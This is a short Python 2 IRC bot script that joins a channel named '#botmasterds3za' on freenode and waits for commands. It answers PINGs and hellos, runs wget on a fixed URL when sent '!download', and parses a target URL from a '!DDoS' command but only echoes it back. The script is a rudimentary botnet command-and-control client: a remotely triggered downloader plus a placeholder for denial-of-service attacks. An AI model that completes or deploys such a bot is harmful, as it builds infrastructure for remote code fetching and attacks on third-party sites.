import socket 
import os  
import  commands
server = "irc.freenode.net" 
channel = "#botmasterds3za" 
botnick = "Mybot" 

def ping(): 
  ircsock.send("PONG :pingis\n")  

def sendmsg(chan , msg): 
  ircsock.send("PRIVMSG "+ chan +" :"+ msg +"\n") 

def joinchan(chan): 
  ircsock.send("JOIN "+ chan +"\n")

def hello(): 
  ircsock.send("PRIVMSG "+ channel +" :Hello!\n")
def download():
  try:
    commands.getoutput('wget http://www.metro.df.gob.mx/imagenes/red/redinternet.pdf')
    ircsock.send("PRIVMSG "+ channel +" :!Descargado\n")
  except Exception, e:
    print "Error"
def DDoS():
  url = ircmsg.split('!')[2][5:]
  ircsock.send("PRIVMSG "+ channel +" :"+url+"\n")
ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ircsock.connect((server, 6667))
ircsock.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This bot is a result of a tutoral covered on http://shellium.org/wiki.\n") # user authentication
ircsock.send("NICK "+ botnick +"\n") 

joinchan(channel) 

while 1: 
  ircmsg = ircsock.recv(2048) 
  ircmsg = ircmsg.strip('\n\r') 
  print(ircmsg) 
  if ircmsg.find(":!download") != -1:
    download()
  if ircmsg.find(":Hello "+ botnick) != -1: 
    hello()
  if ircmsg.find("PING :") != -1: 
    ping()
  if ircmsg.find(":!DDoS") != -1:   
    DDoS()